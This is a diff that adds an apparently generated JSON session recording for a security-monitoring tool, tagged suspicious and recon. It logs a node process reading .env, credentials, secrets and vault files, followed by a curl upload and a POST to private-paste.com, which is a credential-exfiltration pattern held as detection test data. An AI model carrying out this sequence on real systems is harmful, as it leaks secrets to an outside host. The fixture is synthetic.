@@ -1,0 +1,169 @@
+{
+  "format": "sentinel-session-v1",
+  "metadata": {
+    "id": "gen-na-mrn9sarv-q3vtsm",
+    "recordedAt": "2026-07-16T08:46:32.107Z",
+    "durationMs": 3740,
+    "platform": "win32",
+    "hostname": "generator",
+    "username": "eval",
+    "workingDirectory": "C:/project-152",
+    "sentinelVersion": "1.0.0",
+    "tags": [
+      "suspicious",
+      "recon",
+      "MEDIUM",
+      "generated"
+    ]
+  },
+  "events": [
+    {
+      "type": "file_access",
+      "data": {
+        "filePath": "C:/project/.env",
+        "processName": "node.exe",
+        "pid": 5000,
+        "operation": "read",
+        "timestamp": "2026-07-16T08:46:32.502Z",
+        "bytesRead": 1948
+      }
+    },
+    {
+      "type": "file_access",
+      "data": {
+        "filePath": "C:/project/.env.prod",
+        "processName": "node.exe",
+        "pid": 5000,
+        "operation": "read",
+        "timestamp": "2026-07-16T08:46:32.502Z",
+        "bytesRead": 1059
+      }
+    },
+    {
+      "type": "file_access",
+      "data": {
+        "filePath": "C:/project/credentials.json",
+        "processName": "node.exe",
+        "pid": 5000,
+        "operation": "read",
+        "timestamp": "2026-07-16T08:46:32.502Z",
+        "bytesRead": 2837
+      }
+    },
+    {
+      "type": "file_access",
+      "data": {
+        "filePath": "C:/project/config/secrets.yml",
+        "processName": "node.exe",
+        "pid": 5000,
+        "operation": "read",
+        "timestamp": "2026-07-16T08:46:32.502Z",
+        "bytesRead": 2608
+      }
+    },
+    {
+      "type": "file_access",
+      "data": {
+        "filePath": "C:/project/db/config/database.yml",
+        "processName": "node.exe",
+        "pid": 5000,
+        "operation": "read",
+        "timestamp": "2026-07-16T08:46:32.502Z",
+        "bytesRead": 1033
+      }
+    },
+    {
+      "type": "file_access",
+      "data": {
+        "filePath": "C:/project/deploy/ansible/vault.yml",
+        "processName": "node.exe",
+        "pid": 5000,
+        "operation": "read",
+        "timestamp": "2026-07-16T08:46:32.502Z",
+        "bytesRead": 2444
+      }
+    },
+    {
+      "type": "process",
+      "data": {
+        "pid": 5001,
+        "name": "curl.exe",
+        "commandLine": "curl -s -o /dev/null -w \"%{http_code}\" https://private-paste.com/api/upload",
+        "timestamp": "2026-07-16T08:46:32.911Z",
+        "riskIndicators": [
+          "network_tool"
+        ]
+      }
+    },
+    {
+      "type": "flow",
+      "data": {
+        "id": "na-mrn9sarv-a0ftnx",
+        "sessionId": "",
+        "timestamp": "2026-07-16T08:46:33.187Z",
+        "protocol": "TLS",
+        "sourceAddr": "192.168.1.100",
+        "sourcePort": 49048,
+        "destAddr": "185.199.0.1",
+        "destPort": 443,
+        "hostname": "private-paste.com",
+        "sni": "private-paste.com",
+        "bytesSent": 5391,
+        "bytesReceived": 256,
+        "durationMs": 805,
+        "method": "POST",
+        "path": "/api/upload"
+      }
+    },
+    {
+      "type": "git_command",
+      "data": {
+        "pid": 9000,
+        "processName": "git",
+        "commandLine": "git log --oneline -5",
+        "action": "log",
+        "timestamp": "2026-07-16T08:46:33.298Z"
+      }
+    },
+    {
+      "type": "git_command",
+      "data": {
+        "pid": 9000,
+        "processName": "git",
+        "commandLine": "git diff --stat",
+        "action": "other",
+        "timestamp": "2026-07-16T08:46:33.380Z"
+      }
+    },
+    {
+      "type": "process",
+      "data": {
+        "pid": 9001,
+        "name": "git",
+        "commandLine": "git push origin main",
+        "timestamp": "2026-07-16T08:46:33.972Z",
+        "riskIndicators": []
+      }
+    },
+    {
+      "type": "flow",
+      "data": {
+        "id": "na-mrn9sarv-rpj93p",
+        "sessionId": "",
+        "timestamp": "2026-07-16T08:46:34.442Z",
+        "protocol": "TLS",
+        "sourceAddr": "192.168.1.100",
+        "sourcePort": 49020,
+        "destAddr": "140.82.112.4",
+        "destPort": 443,
+        "hostname": "github.com",
+        "sni": "github.com",
+        "bytesSent": 1042,
+        "bytesReceived": 691,
+        "durationMs": 1424,
+        "method": "GET",
+        "path": "/user/project"
+      }
+    }
+  ]
+}
